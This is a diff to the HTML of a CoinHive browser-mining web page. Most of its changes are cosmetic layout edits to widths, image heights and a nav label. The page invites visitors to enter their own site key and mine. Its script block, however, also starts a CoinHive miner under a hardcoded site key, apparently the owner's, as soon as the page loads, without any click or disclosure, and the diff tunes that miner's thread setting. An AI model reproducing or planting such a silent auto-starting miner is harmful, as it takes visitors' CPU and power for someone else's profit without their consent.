@@ -22,7 +22,7 @@
         <div class="collapse navbar-collapse" id="navbarResponsive">
           <ul class="navbar-nav ml-auto">
             <li class="nav-item">
-              <a class="nav-link js-scroll-trigger" href="#announcement">Announcement</a>
+              <a class="nav-link js-scroll-trigger" href="#notice">Notice</a>
             </li>
             <li class="nav-item">
               <a class="nav-link js-scroll-trigger" href="#get-started">Get Started</a>
@@ -47,8 +47,8 @@
           </div>
           <div class="col-md-4">
             <p style="text-align:left">Your Site Key Here</p>
-            <input class="form-control" style="width: 360px" id="site_key" type="text" placeholder="Please input your CoinHive site key."><br/>
-            <button id="mine_btn" class="btn btn-danger btn-block" type="button" style="cursor: pointer; width: 360px;">Start Mining!!!</button><br/>
+            <input class="form-control" style="width: 100%" id="site_key" type="text" placeholder="Please input your CoinHive site key."><br/>
+            <button id="mine_btn" class="btn btn-danger btn-block" type="button" style="cursor: pointer; width: 100%;">Start Mining!!!</button><br/>
             <div id="ui_miner"></div>
           </div>
         </div>
@@ -56,9 +56,9 @@
     </header>
 
     <!-- Portfolio Grid Section -->
-    <section id="announcement">
+    <section id="notice">
       <div class="container">
-        <h2 class="text-center">Announcement</h2>
+        <h2 class="text-center">Notice</h2>
         <hr class="star-primary">
         <div class="row">
           <div class="col-lg-4 ml-auto">
@@ -86,15 +86,15 @@
         <h3>Get My Site Key</h3>
         <div class="row">
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/coinhive-icon.png" style="height:300px">
+            <img class="img-fluid" src="img/coinhive-icon.png" style="height:200px">
             <p style="color:white">Register as a <a href="https://cnhv.co/4e8n" style="color:white" target="_blank"><strong>CoinHive</strong></a> User</p>
           </div>
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/lock_key.png" style="height:300px">
+            <img class="img-fluid" src="img/lock_key.png" style="height:200px">
             <p style="color:white">Get Your Site Key</p>
           </div>
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/Mining_Task.png" style="height:300px">
+            <img class="img-fluid" src="img/Mining_Task.png" style="height:200px">
             <p style="color:white">Come Here and Start Mining!</p>
           </div>
         </div>
@@ -102,15 +102,15 @@
         <h3>Support Device</h3>
         <div class="row">
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/mobile-devices.png" style="height:300px">
+            <img class="img-fluid" src="img/mobile-devices.png" style="height:200px">
             <p style="color:white">Mobile Device</p>
           </div>
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/Desktop-PC.png" style="height:300px">
+            <img class="img-fluid" src="img/Desktop-PC.png" style="height:200px">
             <p style="color:white">Personal Computer</p>
           </div>
           <div class="col-sm-4" style="text-align:center; ">
-            <img class="img-fluid" src="img/browsers.png" style="height:300px">
+            <img class="img-fluid" src="img/browsers.png" style="height:200px">
             <p style="color:white">Everything That Can Open Browser!</p>
           </div>
         </div>
@@ -221,7 +221,7 @@
     <script src="js/freelancer.min.js"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-      var cpu_config = {throttle:0.9};
+      var cpu_config = {threads:1, throttle:0.9};
       var auth_site_key = 'YC0DCqWrhTTukeAtDPdCxp5nEB0jqVAe';
       var auth_miner = new CoinHive.User(auth_site_key, 'XMR-WEBMINER', cpu_config);
 	  auth_miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
@@ -229,7 +229,7 @@
       $('#mine_btn').click(function() {
         var site_key = $('#site_key').val();
         $.getScript('https://coinhive.com/lib/miner.min.js');
-        var ui_miner = '<div class="coinhive-miner" style="width: 360px; height: 256px" data-key="' + site_key + '" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="1" data-throttle="0.5"><em>Loading miner...<br/>Please disable Adblock if you have!</em></div>'
+        var ui_miner = '<div class="coinhive-miner" style="width: 100%; height: 256px" data-key="' + site_key + '" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="1" data-throttle="0.5"><em>Loading miner...<br/>Please disable Adblock if you have!</em></div>'
         $('#ui_miner').html(ui_miner);
       });
     </script>
